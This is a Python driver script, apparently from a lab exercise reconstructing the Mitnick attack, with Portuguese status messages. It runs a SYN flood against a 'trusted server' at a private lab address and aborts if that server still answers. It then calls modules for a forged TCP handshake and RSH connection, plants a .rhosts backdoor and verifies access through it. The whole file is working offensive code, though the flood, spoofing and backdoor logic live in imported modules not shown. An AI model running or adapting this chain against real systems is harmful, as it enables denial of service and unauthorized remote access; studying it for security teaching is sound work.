import socket

from attack import main as run_flood
from rsh_connect import rsh_attack
from backdoor import verify_backdoor

SEPARATOR = "=" * 55
TRUSTED_IP = "10.0.2.30"
TRUSTED_PORT = 514


def _server_is_down(ip: str = TRUSTED_IP, port: int = TRUSTED_PORT, timeout: float = 1.5) -> bool:
    try:
        socket.create_connection((ip, port), timeout=timeout).close()
        return False
    except OSError:
        return True


def run_attack() -> None:
    print(SEPARATOR)
    print("[ETAPA 1] SYN Flood no Servidor Confiável (10.0.2.30)")
    print(SEPARATOR)
    run_flood()

    if not _server_is_down():
        print("[!] Servidor Confiável ainda respondendo — flood insuficiente.")
        print("[!] Abortando: risco de RST quebrar a sessão forjada.")
        return

    print(f"[+] Servidor Confiável ({TRUSTED_IP}) confirmado como inativo.")

    print(SEPARATOR)
    print("[ETAPA 2] Captura do ISN via Scapy (LAN sniffer)")
    print(SEPARATOR)

    print(SEPARATOR)
    print("[ETAPAS 3–4] Handshake forjado → Conexão RSH → Backdoor")
    print(SEPARATOR)
    rsh_attack()

    print(SEPARATOR)
    print("[ETAPA 5] Acesso direto via backdoor .rhosts")
    print(SEPARATOR)
    verify_backdoor()

    print(SEPARATOR)
    print("[FIM] Ataque Mitnick concluído.")
    print(SEPARATOR)


if __name__ == "__main__":
    run_attack()
